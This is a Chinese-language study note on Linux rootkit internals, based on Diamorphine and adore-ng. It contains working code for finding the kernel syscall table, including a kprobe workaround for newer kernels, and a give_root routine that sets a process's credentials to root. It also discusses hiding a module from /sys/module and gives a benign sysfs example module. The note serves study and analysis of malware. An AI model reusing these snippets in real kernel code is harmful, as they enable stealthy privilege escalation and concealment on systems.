# Diamorphine

### syscall_table 获取

##### LINUX_VERSION_CODE 《= KERNEL_VERSION(4, 4, 0)

暴力搜索：

```c
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
```

##### LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0) &&  LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)

```c
syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
```

##### LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

当内核版本 >= KERNEL_VERSION(5,7,0) 时候，kallsyms_lookup_name 不在导出，需要通过 kprobe获取其地址：

```c
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

kallsyms_lookup_name_t kallsyms_lookup_name;
register_kprobe(&kp);
kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
unregister_kprobe(&kp);

syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
```

### 权限提升

```c
void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
}
```

# adore-ng

### 模块隐藏

通过对adore-ng 代码分析，我们还需要对 /sys/module 下的 模块文件进行隐藏。

sysfs 是 Linux 内核中的一个虚拟文件系统，它提供了一个统一的接口来访问内核对象，kobject 代表一个内核对象，而 kset 是一组 kobject 的集合。

内核模块加载时，调用 mod_sysfs_setup(/kernel/module/sysfs.c) 函数，初始化其对应的 /sys/module下面的目录。

### kobject、kset

Kobject代表一个目录, 而Attribute代表该目录下的文件

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/slab.h>		/*kzalloc, kmalloc*/
#include <linux/sysfs.h>	/*optional: has been included in kobject.h */

/* 
 * Another special macro (MODULE_LICENSE) is used to tell the kernel that this 
 * module bears a free license; without such a declaration, the kernel 
 * complains when the module is loaded.
 */
MODULE_LICENSE("Dual BSD/GPL");

static struct kset    *example_kset;
static struct kobject *example_kobj;

static int kset_attr_value = 0;
static int kobj_attr_value = 0;

/*
 * functions for kset
 */

/*the attribute for the kset*/
static struct attribute kset_attr = {
	.name = "kset_attr",
	.mode = VERIFY_OCTAL_PERMISSIONS(0664),
};

static void kset_self_release(struct kobject *kobj)
{
	struct kset *kset = container_of(kobj, struct kset, kobj);
	printk(KERN_ALERT "release kset (%p)\n", kset);
	kfree(kset);
}

static ssize_t kset_kobj_attr_show(struct kobject *kobj, struct attribute *attr,
			      char *buf)
{
	ssize_t ret = -EIO;
	
	ret = sprintf(buf, "%d\n", kset_attr_value);
	
	return ret;
}

static ssize_t kset_kobj_attr_store(struct kobject *kobj, struct attribute *attr,
			       const char *buf, size_t count)
{
	ssize_t ret = -EIO;
	
	sscanf(buf, "%du", &kset_attr_value);
	
	printk(KERN_ALERT "attribute value from user for kset %s\n", buf);

	ret = count;
	
	return ret;
}

const struct sysfs_ops kset_kobj_sysfs_ops = {
	.show	= kset_kobj_attr_show,
	.store	= kset_kobj_attr_store,
};

/*your own ktype for the kset's kobject*/
static struct kobj_type kset_self_ktype = {
	.release = kset_self_release,
	.sysfs_ops = &kset_kobj_sysfs_ops,
};

/*
 * functions for kobject
 */
 
static ssize_t kobject_attr_show(struct kobject *kobj, struct kobj_attribute *attr,
			      char *buf)
{
	ssize_t ret = -EIO;
	
	ret = sprintf(buf, "%d\n", kobj_attr_value);
	
	return ret;
}

static ssize_t kobject_attr_store(struct kobject *kobj, struct kobj_attribute *attr,
			       const char *buf, size_t count)
{
	ssize_t ret = -EIO;
	
	sscanf(buf, "%du", &kobj_attr_value);
	
	printk(KERN_ALERT "attribute value from user for kobject %s\n", buf);

	ret = count;
	
	return ret;
}

/*the attribute for the kobject*/
static struct kobj_attribute kobj_attr =
	__ATTR(kobj_attr, 0664, kobject_attr_show, kobject_attr_store);

static void ktype_release(struct kobject *kobj)
{
	printk(KERN_ALERT "release kobject (%p)\n", kobj);
	kfree(kobj);
}

/*your own ktype for the kobject*/
static struct kobj_type kobject_ktype = {
	.release	= ktype_release,
	/*Note: 
	 * Here we don't define the ops but use kobj_sysfs_ops which is defined in kobject.c
	 * because we have done it in manual_kobject_attribute, don't want to do it again
	 */
	.sysfs_ops	= &kobj_sysfs_ops,
};

static int __init example_init(void)
{
	int retval;
	
	/*first: allocate a kset memory and prepare the kobj.ktype for this kset*/
	example_kset = kzalloc(sizeof(*example_kset), GFP_KERNEL);
	if(!example_kset)
		return -ENOMEM;
	retval = kobject_set_name(&example_kset->kobj, "%s", "example_kset");
	if (retval) {
		kfree(example_kset);
		return retval;
	}
	example_kset->uevent_ops = NULL;
	example_kset->kobj.parent = NULL;
	example_kset->kobj.ktype = &kset_self_ktype;
	example_kset->kobj.kset = NULL;
	
	/*second: register the kset*/
	retval = kset_register(example_kset);
	if (retval) {
		kfree(example_kset);
		return retval;
	}
	
	/*third: create the attribute file associated with this kset*/
	retval = sysfs_create_file(&example_kset->kobj, &kset_attr);
	if (retval) {
		printk(KERN_WARNING "%s: sysfs_create_file for kset error: %d\n",
		       __func__, retval);
		goto create_kset_attribute_error;
	}
	
	/*4th: allocate a kobject memory*/
	example_kobj = kzalloc(sizeof(*example_kobj), GFP_KERNEL);
	if (!example_kobj) {
		retval = -ENOMEM;
		goto allocate_kobject_error;
	}
	
	/*5th: define your own ktype, and init the kobject*/
	kobject_init(example_kobj, &kobject_ktype);
	
	/*6th: set the kobject's kset*/
	example_kobj->kset = example_kset;
	
	/*7th: add the kobject to kernel*/
	retval = kobject_add(example_kobj, NULL, "%s", "example_kobj");
	if (retval) {
		printk(KERN_WARNING "%s: kobject_add error: %d\n",
		       __func__, retval);
		goto kobject_add_error;
	}
	
	/*8th: create the attribute file associated with this kobject */
	retval = sysfs_create_file(example_kobj, &kobj_attr.attr);
	if (retval) {
		printk(KERN_WARNING "%s: sysfs_create_file error: %d\n",
		       __func__, retval);
		goto create_attribute_error;
	}
	
	return 0;

create_attribute_error:
kobject_add_error:
	kobject_put(example_kobj);
allocate_kobject_error:
	example_kobj = NULL;
create_kset_attribute_error:
	kset_unregister(example_kset);
	example_kset = NULL;
	return retval;
}

static void example_exit(void)
{
	kobject_put(example_kobj);
	example_kobj = NULL;
	kset_unregister(example_kset);
	example_kset = NULL;
}

module_init(example_init);
module_exit(example_exit);

MODULE_AUTHOR("John LiuXin");
MODULE_DESCRIPTION("Example of manual create kobject and attribute");
```





# 资料

Diamorphine

https://github.com/m0nad/Diamorphine

adore-ng

https://github.com/yaoyumeng/adore-ng

设备模型

https://www.cnblogs.com/jliuxin/p/14129383.html